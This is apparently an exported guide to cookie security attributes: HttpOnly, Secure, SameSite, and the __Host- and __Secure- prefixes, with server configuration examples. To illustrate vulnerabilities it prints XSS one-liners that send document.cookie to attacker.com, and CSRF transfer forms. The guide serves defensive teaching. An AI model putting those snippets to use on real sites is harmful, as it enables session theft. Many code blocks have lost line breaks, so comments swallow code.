# HttpOnly and Secure cookies

---

## Introduction

HTTP cookies are small pieces of data stored by the browser and sent with every request to the server. While essential for maintaining state in web applications, cookies can be a significant security risk if not properly configured. This guide covers all cookie security attributes, their purposes, implementations, and best practices.

### What are Cookies?

Cookies are name-value pairs sent by the server via the `Set-Cookie` header and automatically included by the browser in subsequent requests via the `Cookie` header. They are commonly used for:
- Session management
- User authentication
- Personalization
- Tracking and analytics

### Why Cookie Security Matters

Improperly configured cookies can lead to:
- **Session hijacking**: Attackers stealing session tokens
- **Cross-Site Scripting (XSS)**: Malicious scripts accessing sensitive cookies
- **Cross-Site Request Forgery (CSRF)**: Unauthorized actions using user’s cookies
- **Man-in-the-Middle (MitM) attacks**: Interception of cookies over insecure connections

---

## HttpOnly Attribute

### Definition

The `HttpOnly` attribute prevents client-side JavaScript from accessing the cookie through `document.cookie` or other DOM APIs. This attribute is crucial for protecting sensitive cookies from XSS attacks.

### ⚠️ CRITICAL: HttpOnly Does NOT Protect Against CSRF

**Important Clarification:**
- ✅ HttpOnly **protects against XSS** (Cross-Site Scripting)
- ❌ HttpOnly **does NOT protect against CSRF** (Cross-Site Request Forgery)

These are two completely different attack vectors. See `CRITICAL_CLARIFICATION` below for detailed explanation.

[**Critical Clarification: HttpOnly vs CSRF Protection**](HttpOnly%20and%20Secure%20cookies/Critical%20Clarification%20HttpOnly%20vs%20CSRF%20Protection%202b2562ad76f0805394d7c9672a5e1525.md)

### How It Works

When a cookie has the `HttpOnly` flag:
- ✅ The cookie is sent with HTTP requests automatically
- ✅ Server-side code can read and write the cookie
- ❌ JavaScript cannot access the cookie via `document.cookie`
- ❌ Browser extensions cannot access the cookie (in most cases)

### Syntax

```
Set-Cookie: sessionId=abc123; HttpOnly
```

### Example: Without HttpOnly (Vulnerable to XSS)

```jsx
// Server sets cookie without HttpOnlySet-Cookie: sessionId=abc123
// Attacker's XSS script can steal the cookie<script>  fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
```

### Example: With HttpOnly (Protected from XSS)

```jsx
// Server sets cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly
// JavaScript cannot access itconsole.log(document.cookie); // Does not include sessionId// Result: "" (empty or other non-HttpOnly cookies)
```

### Example: HttpOnly Does NOT Prevent CSRF

```jsx
// Cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly; Secure
// CSRF attack from evil.com:// User visits evil.com while logged into bank.com// evil.com submits form to bank.com/transferPOST https://bank.com/transfer HTTP/1.1Cookie: sessionId=abc123  // Browser STILL sends cookie automatically!// HttpOnly did NOT prevent this because:// - Browser automatically sends cookies with requests// - HttpOnly only prevents JavaScript access// - CSRF doesn't need JavaScript to access the cookie
```

### When to Use HttpOnly

**Always use HttpOnly for:**
- Session tokens
- Authentication cookies
- CSRF tokens (to prevent XSS from stealing them)
- Any sensitive data stored in cookies

**You can skip HttpOnly for:**
- Client-side only cookies (e.g., UI preferences)
- Cookies that need JavaScript access (use with caution)

### Limitations

- Does not protect against CSRF attacks (use SameSite or CSRF tokens)
- Does not encrypt the cookie value
- Does not prevent server-side vulnerabilities
- Does not protect against browser extensions with elevated privileges

---

## Secure Attribute

### Definition

The `Secure` attribute ensures cookies are only transmitted over HTTPS connections. Browsers will refuse to send `Secure` cookies over unencrypted HTTP connections.

### How It Works

When a cookie has the `Secure` flag:
- ✅ Cookie is sent only over HTTPS
- ✅ Cookie is sent only over secure WebSocket connections (wss://)
- ❌ Cookie is NOT sent over HTTP
- ❌ Cookie is NOT sent over insecure WebSocket connections (ws://)

### Syntax

```
Set-Cookie: sessionId=abc123; Secure
```

### Example: Without Secure (Vulnerable)

```
// User on HTTP connection
GET http://example.com/dashboard HTTP/1.1
Cookie: sessionId=abc123  // Sent in plaintext, can be intercepted
```

### Example: With Secure (Protected)

```
// User on HTTP connection
GET http://example.com/dashboard HTTP/1.1
Cookie: (sessionId not sent)  // Browser refuses to send Secure cookie

// User on HTTPS connection
GET https://example.com/dashboard HTTP/1.1
Cookie: sessionId=abc123  // Sent over encrypted connection
```

### When to Use Secure

**Always use Secure for:**
- All cookies containing sensitive data
- Session cookies
- Authentication tokens
- Any cookie in production environments
- Cookies with `SameSite=None` (required by modern browsers)

**Exception:**
- Development environments using HTTP (but use HTTPS in production)

### Important Notes

- `Secure` does NOT encrypt the cookie value itself
- `Secure` relies on HTTPS/TLS for encryption
- Cookies without `Secure` can be intercepted over HTTP
- Modern browsers require `Secure` for `SameSite=None` cookies

### Browser Behavior

- **Chrome/Edge**: Requires `Secure` for `SameSite=None` cookies
- **Firefox**: Requires `Secure` for `SameSite=None` cookies
- **Safari**: Requires `Secure` for `SameSite=None` cookies
- **All browsers**: Will not send `Secure` cookies over HTTP

---

## SameSite Attribute

### Definition

The `SameSite` attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks. It’s one of the most important modern cookie security features.

### ⚠️ This is What Actually Protects Against CSRF

Unlike HttpOnly, the `SameSite` attribute **does protect against CSRF attacks** by controlling when cookies are sent with requests.

### Values

### 1. SameSite=Strict

**Behavior:**
- Cookie is sent ONLY with same-site requests
- Cookie is NOT sent with any cross-site requests, including top-level navigations
- Maximum CSRF protection

**Use Cases:**
- Banking applications
- Administrative panels
- High-security applications
- When user experience allows for re-authentication

**Example:**

```
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
```

**Scenario:**

```
User clicks link from email: https://bank.com/transfer?to=attacker&amount=1000
Browser sends request WITHOUT cookie (cross-site navigation)
User must log in again (better security, but may impact UX)
```

### 2. SameSite=Lax (Default in Modern Browsers)

**Behavior:**
- Cookie is sent with same-site requests
- Cookie is sent with top-level GET navigations (e.g., clicking a link)
- Cookie is NOT sent with cross-site POST requests, iframes, images, or AJAX calls
- Good balance between security and usability

**Use Cases:**
- Most web applications (recommended default)
- E-commerce sites
- Social media platforms
- When you want CSRF protection without breaking external links

**Example:**

```
Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly
```

**Scenario:**

```
User clicks link from email: https://shop.com/product/123
Browser sends request WITH cookie (top-level navigation, GET request)
User stays logged in (good UX)

Attacker's form on evil.com:
<form action="https://shop.com/transfer" method="POST">
  <input name="amount" value="1000">
</form>
Browser sends request WITHOUT cookie (cross-site POST)
CSRF attack prevented
```

### 3. SameSite=None

**Behavior:**
- Cookie is sent with both same-site and cross-site requests
- **REQUIRES** the `Secure` attribute
- Used for third-party integrations

**Use Cases:**
- Embedded widgets (e.g., payment processors)
- OAuth flows
- Cross-origin API calls
- Third-party authentication

**Example:**

```
Set-Cookie: sessionId=abc123; SameSite=None; Secure; HttpOnly
```

**Important:**
- Must be used with `Secure` attribute
- Some browsers block third-party cookies by default
- Consider alternatives like OAuth2 or token-based auth

### SameSite Default Behavior

**Modern Browsers (2020+):**
- Chrome 80+, Edge 80+, Firefox 69+, Safari 13+
- Default to `SameSite=Lax` if not specified
- Legacy behavior was `SameSite=None`

**Legacy Browsers:**
- Treat missing `SameSite` as `None`
- May send cookies with all requests

**Best Practice:**
Always explicitly set `SameSite` to avoid relying on browser defaults.

### SameSite and CSRF Protection

**How SameSite Prevents CSRF:**

1. **Strict Mode:**
    
    ```
    Attacker's site: evil.com
    Target site: bank.com
    
    User visits evil.com, which contains:
    <form action="https://bank.com/transfer" method="POST">
      <input name="to" value="attacker">
      <input name="amount" value="10000">
    </form>
    
    Browser sends request WITHOUT cookie (cross-site POST)
    Attack fails
    ```
    
2. **Lax Mode:**
    
    ```
    Same scenario as above - cookie not sent with POST
    But cookie IS sent when user clicks link (GET navigation)
    ```
    
3. **None Mode:**
    
    ```
    Cookie IS sent - no CSRF protection
    Must use additional CSRF tokens
    ```
    

---

## Cookie Prefixes

Cookie prefixes (`__Secure-` and `__Host-`) provide additional security by enforcing constraints at the browser level.

### __Secure- Prefix

**Requirements:**
- Cookie name must start with `__Secure-`
- Must have `Secure` attribute
- Must be set from secure (HTTPS) origin

**Purpose:**
- Prevents accidental insecure cookie setting
- Enforces secure transmission

**Example:**

```
// ✅ Valid
Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly

// ❌ Invalid - missing Secure
Set-Cookie: __Secure-sessionId=abc123; HttpOnly
// Browser will reject this cookie

// ❌ Invalid - set from HTTP
// Browser will reject if set from non-HTTPS origin
```

**Use Case:**

```jsx
// Server coderes.cookie('__Secure-sessionId', sessionToken, {
  secure: true,  httpOnly: true,  sameSite: 'Strict'});
```

### __Host- Prefix

**Requirements:**
- Cookie name must start with `__Host-`
- Must have `Secure` attribute
- Must have `Path=/`
- Must NOT have `Domain` attribute
- Must be set from secure (HTTPS) origin

**Purpose:**
- Prevents subdomain cookie access
- Prevents path-based cookie scope issues
- Maximum isolation

**Example:**

```
// ✅ Valid
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/; HttpOnly

// ❌ Invalid - has Domain attribute
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/; Domain=example.com
// Browser will reject

// ❌ Invalid - Path is not /
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/api; HttpOnly
// Browser will reject
```

**Use Case:**

```jsx
// Prevents cookie from being accessible to subdomains// example.com sets: __Host-sessionId=abc123// subdomain.example.com CANNOT access this cookie
```

**Security Benefits:**
- Prevents subdomain takeover attacks
- Prevents cookie scope confusion
- Ensures cookie is only for the exact host

---

## Other Cookie Attributes

### Domain Attribute

**Purpose:**
Controls which domains can receive the cookie.

**Syntax:**

```
Set-Cookie: sessionId=abc123; Domain=example.com
```

**Behavior:**
- If `Domain` is set to `example.com`, cookie is sent to:
- `example.com`
- `www.example.com`
- `api.example.com`
- Any subdomain of `example.com`

- If `Domain` is NOT set, cookie is sent only to:
    - The exact host that set it
    - Not to subdomains

**Security Considerations:**

```
// ⚠️ Risky - too broad
Set-Cookie: sessionId=abc123; Domain=.example.com
// Accessible to all subdomains, including compromised ones

// ✅ Better - no Domain attribute
Set-Cookie: sessionId=abc123
// Only accessible to exact host

// ✅ Best - use __Host- prefix
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/
// Cannot set Domain, maximum security
```

### Path Attribute

**Purpose:**
Controls which URL paths can access the cookie.

**Syntax:**

```
Set-Cookie: sessionId=abc123; Path=/api
```

**Behavior:**
- Cookie is sent only for requests to paths matching the specified path
- Path matching is prefix-based

**Examples:**

```
Set-Cookie: sessionId=abc123; Path=/

// Sent with:
// ✅ https://example.com/
// ✅ https://example.com/dashboard
// ✅ https://example.com/api/users

Set-Cookie: sessionId=abc123; Path=/api

// Sent with:
// ✅ https://example.com/api/users
// ✅ https://example.com/api/auth/login
// ❌ https://example.com/dashboard
// ❌ https://example.com/
```

**Security Considerations:**
- Use most restrictive path possible
- Default is the path of the document setting the cookie
- For session cookies, typically use `Path=/`

### Expires and Max-Age Attributes

**Purpose:**
Control when the cookie expires and is deleted.

**Expires:**

```
Set-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT
```

- Absolute expiration date/time
- Must be in GMT format
- If not set, cookie is a “session cookie” (deleted when browser closes)

**Max-Age:**

```
Set-Cookie: sessionId=abc123; Max-Age=3600
```

- Relative expiration in seconds
- More convenient than `Expires`
- If both are set, `Max-Age` takes precedence

**Security Best Practices:**
- Set short expiration times for sensitive cookies
- Use session cookies (no expiration) for temporary data
- Implement server-side session expiration
- Rotate session tokens periodically

**Example:**

```jsx
// Session cookie (deleted when browser closes)Set-Cookie: sessionId=abc123; HttpOnly; Secure
// Persistent cookie (expires in 1 hour)Set-Cookie: sessionId=abc123; HttpOnly; Secure; Max-Age=3600// Persistent cookie (expires on specific date)Set-Cookie: rememberMe=yes; HttpOnly; Secure; Expires=Wed, 21 Oct 2025 07:28:00 GMT
```

---

## Complete Cookie Security Implementation

### Recommended Configuration for Session Cookies

```
Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
```

**Why this configuration:**
- `__Host-` prefix: Prevents subdomain access
- `Secure`: Only over HTTPS
- `HttpOnly`: No JavaScript access (XSS protection)
- `SameSite=Strict`: Maximum CSRF protection
- `Path=/`: Available site-wide
- `Max-Age=3600`: Expires in 1 hour

### Recommended Configuration for Authentication Cookies

```
Set-Cookie: __Secure-authToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400
```

**Why this configuration:**
- `__Secure-` prefix: Enforces secure transmission
- `Secure`: Only over HTTPS
- `HttpOnly`: No JavaScript access (XSS protection)
- `SameSite=Lax`: Balance of CSRF protection and usability
- `Path=/`: Available site-wide
- `Max-Age=86400`: Expires in 24 hours

### Recommended Configuration for Third-Party Cookies

```
Set-Cookie: __Secure-widgetSession=def456; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800
```

**Why this configuration:**
- `__Secure-` prefix: Enforces secure transmission
- `Secure`: Required for `SameSite=None`
- `HttpOnly`: No JavaScript access (XSS protection)
- `SameSite=None`: Allows cross-site requests (no CSRF protection, use tokens)
- `Path=/`: Available site-wide
- `Max-Age=1800`: Expires in 30 minutes

### Implementation Examples

### Node.js (Express)

```jsx
const express = require('express');const cookieParser = require('cookie-parser');const app = express();app.use(cookieParser());// Set secure session cookieapp.post('/login', (req, res) => {
  const sessionToken = generateSessionToken();  res.cookie('__Host-sessionId', sessionToken, {
    secure: true,           // HTTPS only    httpOnly: true,         // No JavaScript access (XSS protection)    sameSite: 'strict',     // CSRF protection    path: '/',              // Site-wide    maxAge: 3600000,        // 1 hour    // Note: __Host- prefix requires no domain attribute  });  res.json({ success: true });});
```

### Python (Flask)

```python
from flask import Flask, make_response, request
from datetime import datetime, timedelta
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    session_token = generate_session_token()
    response = make_response({'success': True})
    response.set_cookie(
        '__Host-sessionId',
        value=session_token,
        secure=True,           # HTTPS only        httponly=True,         # No JavaScript access (XSS protection)        samesite='Strict',     # CSRF protection        path='/',              # Site-wide        max_age=3600,          # 1 hour        # Note: __Host- prefix requires no domain parameter    )
    return response
```

### PHP

```php
<?phpfunction setSecureSessionCookie($sessionId) {
    setcookie(
        '__Host-sessionId',        $sessionId,        [
            'expires' => time() + 3600,  // 1 hour            'path' => '/',            'secure' => true,            // HTTPS only            'httponly' => true,          // No JavaScript access (XSS protection)            'samesite' => 'Strict'       // CSRF protection            // Note: __Host- prefix requires no domain option        ]
    );}
// UsagesetSecureSessionCookie('abc123');?>
```

### Java (Spring Boot)

```java
import org.springframework.http.ResponseCookie;import org.springframework.http.ResponseEntity;@PostMapping("/login")public ResponseEntity<?> login() {    String sessionToken = generateSessionToken();    ResponseCookie cookie = ResponseCookie.from("__Host-sessionId", sessionToken)        .httpOnly(true)          // No JavaScript access (XSS protection)        .secure(true)            // HTTPS only        .path("/")               // Site-wide        .sameSite("Strict")      // CSRF protection        .maxAge(Duration.ofHours(1))  // 1 hour        .build();        // Note: __Host- prefix requires no domain    return ResponseEntity.ok()        .header(HttpHeaders.SET_COOKIE, cookie.toString())        .body(Map.of("success", true));}
```

### C# (ASP.NET Core)

```csharp
using Microsoft.AspNetCore.Http;public IActionResult Login(){    var sessionToken = GenerateSessionToken();    var cookieOptions = new CookieOptions
    {        HttpOnly = true,         // No JavaScript access (XSS protection)        Secure = true,           // HTTPS only        SameSite = SameSiteMode.Strict,  // CSRF protection        Path = "/",              // Site-wide        MaxAge = TimeSpan.FromHours(1)   // 1 hour        // Note: __Host- prefix requires no Domain    };    Response.Cookies.Append("__Host-sessionId", sessionToken, cookieOptions);    return Ok(new { success = true });}
```

---

## Browser Compatibility

### HttpOnly Support

- ✅ **All modern browsers**: Full support
- ✅ **IE 6+**: Supported
- ✅ **Mobile browsers**: Full support

### Secure Support

- ✅ **All modern browsers**: Full support
- ✅ **IE 6+**: Supported
- ✅ **Mobile browsers**: Full support

### SameSite Support

- ✅ **Chrome 51+**: Full support
- ✅ **Firefox 60+**: Full support
- ✅ **Safari 12+**: Full support (with some quirks in older versions)
- ✅ **Edge 79+**: Full support
- ⚠️ **IE 11**: Not supported
- ⚠️ **Older browsers**: Not supported (default to None behavior)

### Cookie Prefixes Support

- ✅ **Chrome 49+**: `__Secure-` and `__Host-` support
- ✅ **Firefox 50+**: `__Secure-` and `__Host-` support
- ✅ **Safari 12+**: `__Secure-` and `__Host-` support
- ✅ **Edge 79+**: `__Secure-` and `__Host-` support
- ⚠️ **IE 11**: Not supported (prefixes ignored, but cookies still work)

### Testing Cookie Attributes

**Browser DevTools:**
1. Open DevTools (F12)
2. Go to Application/Storage tab
3. Click Cookies
4. View cookie attributes

**Command Line (curl):**

```bash
# Check Set-Cookie headercurl -I https://example.com/login
# Check if cookie is sentcurl -v -H "Cookie: sessionId=abc123" https://example.com/api
```

**Online Tools:**
- SecurityHeaders.com
- Cookie-Editor browser extension
- Browser DevTools Network tab

---

## Common Vulnerabilities and Mitigations

### 1. Missing HttpOnly (XSS Vulnerability)

**Vulnerability:**

```jsx
// Cookie set without HttpOnlySet-Cookie: sessionId=abc123
// XSS attack<script>  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;</script>
```

**Mitigation:**

```jsx
// Always use HttpOnly for sensitive cookiesSet-Cookie: sessionId=abc123; HttpOnly
```

### 2. Missing Secure (MitM Vulnerability)

**Vulnerability:**

```jsx
// Cookie set without SecureSet-Cookie: sessionId=abc123; HttpOnly
// Attacker on same network intercepts HTTP traffic// Cookie sent in plaintext, can be stolen
```

**Mitigation:**

```jsx
// Always use Secure in productionSet-Cookie: sessionId=abc123; HttpOnly; Secure
```

### 3. Missing SameSite (CSRF Vulnerability)

**Vulnerability:**

```jsx
// Cookie set without SameSiteSet-Cookie: sessionId=abc123; HttpOnly; Secure
// CSRF attack// Attacker's site: evil.com<form action="https://bank.com/transfer" method="POST">  <input name="to" value="attacker">  <input name="amount" value="10000"></form>// Cookie sent with cross-site request
```

**Mitigation:**

```jsx
// Use SameSite=Strict or LaxSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

**Note:** HttpOnly does NOT prevent this CSRF attack. Only SameSite (or CSRF tokens) can prevent it.

### 4. Overly Broad Domain (Subdomain Attack)

**Vulnerability:**

```jsx
// Cookie set with broad domainSet-Cookie: sessionId=abc123; Domain=.example.com// If subdomain.example.com is compromised// Attacker can access the cookie
```

**Mitigation:**

```jsx
// Don't set Domain, or use __Host- prefixSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/
```

### 5. Long-Lived Cookies (Session Fixation)

**Vulnerability:**

```jsx
// Cookie with very long expirationSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2030 07:28:00 GMT
// If stolen, remains valid for years
```

**Mitigation:**

```jsx
// Use short expiration timesSet-Cookie: sessionId=abc123; Max-Age=3600  // 1 hour// Implement server-side session rotation// Regenerate session ID periodically
```

### 6. SameSite=None Without Secure

**Vulnerability:**

```jsx
// SameSite=None without Secure (invalid, but some servers allow)Set-Cookie: sessionId=abc123; SameSite=None
// Modern browsers reject this, but legacy behavior may differ
```

**Mitigation:**

```jsx
// Always use Secure with SameSite=NoneSet-Cookie: sessionId=abc123; SameSite=None; Secure
```

### 7. Cookie Theft via Document.cookie

**Vulnerability:**

```jsx
// Cookie accessible via JavaScriptSet-Cookie: sessionId=abc123  // Missing HttpOnly// Any script can access itvar cookie = document.cookie;
```

**Mitigation:**

```jsx
// Use HttpOnlySet-Cookie: sessionId=abc123; HttpOnly
// JavaScript cannot access itconsole.log(document.cookie);  // Does not include sessionId
```

---

## Real-World Scenarios

### Scenario 1: E-Commerce Session Management

**Requirements:**
- User stays logged in while browsing
- Session persists across page navigations
- Protection against XSS and CSRF
- Good user experience

**Solution:**

```jsx
Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400
```

**Why:**
- `__Secure-` prefix: Enforces secure transmission
- `Secure`: HTTPS only
- `HttpOnly`: XSS protection
- `SameSite=Lax`: CSRF protection while allowing external links
- `Max-Age=86400`: 24-hour session

### Scenario 2: Banking Application

**Requirements:**
- Maximum security
- No cross-site cookie transmission
- User can re-authenticate if needed

**Solution:**

```jsx
Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=1800
```

**Why:**
- `__Host-` prefix: Maximum isolation, no subdomain access
- `SameSite=Strict`: No cross-site requests (CSRF protection)
- `Max-Age=1800`: 30-minute session (shorter for security)

### Scenario 3: OAuth/SSO Integration

**Requirements:**
- Cross-origin cookie transmission
- Third-party authentication
- Secure transmission

**Solution:**

```jsx
Set-Cookie: __Secure-oauthState=xyz789; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=600
```

**Why:**
- `SameSite=None`: Allows cross-origin requests
- `Secure`: Required for `SameSite=None`
- `Max-Age=600`: Short-lived (10 minutes) for OAuth state
- **Note:** No CSRF protection from SameSite, must use CSRF tokens

### Scenario 4: Multi-Tenant SaaS Application

**Requirements:**
- Cookies scoped to specific tenant
- No cross-tenant cookie access
- Subdomain isolation

**Solution:**

```jsx
// For tenant1.example.comSet-Cookie: __Host-tenant-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/// For tenant2.example.comSet-Cookie: __Host-tenant-sessionId=def456; Secure; HttpOnly; SameSite=Lax; Path=/
```

**Why:**
- `__Host-` prefix: Prevents subdomain access
- Each tenant gets isolated cookies
- No `Domain` attribute ensures host-specific scope

### Scenario 5: API Authentication

**Requirements:**
- RESTful API authentication
- Mobile app and web app support
- Token-based authentication

**Solution:**

```jsx
// Option 1: Cookie-based (for web)Set-Cookie: __Secure-apiToken=xyz789; Secure; HttpOnly; SameSite=Strict; Path=/api; Max-Age=3600// Option 2: Token in Authorization header (for mobile)// More appropriate for APIs, but cookies can work too
```

**Why:**
- `Path=/api`: Scoped to API endpoints
- `SameSite=Strict`: Maximum security for API
- Consider using Bearer tokens instead for APIs

### Scenario 6: Remember Me Functionality

**Requirements:**
- Long-lived authentication
- Persistent login
- Secure storage

**Solution:**

```jsx
// Remember me token (long-lived, but separate from session)Set-Cookie: __Secure-rememberToken=longlived123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000// Regular session (short-lived)Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
```

**Why:**
- Separate tokens for different purposes
- Remember token can be longer-lived
- Session token should be short-lived
- Both should be HttpOnly and Secure

---

## Summary

### Essential Cookie Security Checklist

✅ **Always use for sensitive cookies:**
- `HttpOnly`: Prevents JavaScript access (XSS protection)
- `Secure`: HTTPS only transmission
- `SameSite`: CSRF protection (Strict or Lax)

✅ **Consider using:**
- `__Host-` or `__Secure-` prefix: Additional security enforcement
- Short `Max-Age`: Limit exposure window
- Restrictive `Path`: Minimize scope

✅ **Avoid:**
- Setting `Domain` unless necessary
- Long expiration times
- `SameSite=None` without `Secure`
- Sensitive data in cookies without `HttpOnly`

### Quick Reference

| Attribute | Protects Against | Purpose |
| --- | --- | --- |
| `HttpOnly` | XSS (cookie theft) | Prevent JavaScript access to cookies |
| `Secure` | MitM attacks | Ensure HTTPS-only transmission |
| `SameSite=Strict` | CSRF attacks | Maximum CSRF protection |
| `SameSite=Lax` | CSRF attacks | Balanced CSRF protection |
| `SameSite=None` | None (allows CSRF) | Cross-site requests (use with tokens) |
| `__Host-` prefix | Subdomain attacks | Subdomain isolation |
| `__Secure-` prefix | Insecure cookies | Enforce Secure attribute |

### Final Recommendations

1. **Default Configuration:**
    
    ```
    Set-Cookie: __Secure-sessionId=<token>; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
    ```
    
2. **High Security Configuration:**
    
    ```
    Set-Cookie: __Host-sessionId=<token>; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=1800
    ```
    
3. **Third-Party Configuration:**
    
    ```
    Set-Cookie: __Secure-widgetId=<token>; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800
    ```
    

### Key Takeaways

1. **HttpOnly protects against XSS, NOT CSRF**
2. **SameSite protects against CSRF**
3. **Secure ensures HTTPS-only transmission**
4. **Use all three together for maximum security**
5. **Cookie prefixes add additional enforcement**

Remember: Cookie security is just one layer of defense. Always implement defense-in-depth with proper authentication, authorization, input validation, and other security measures.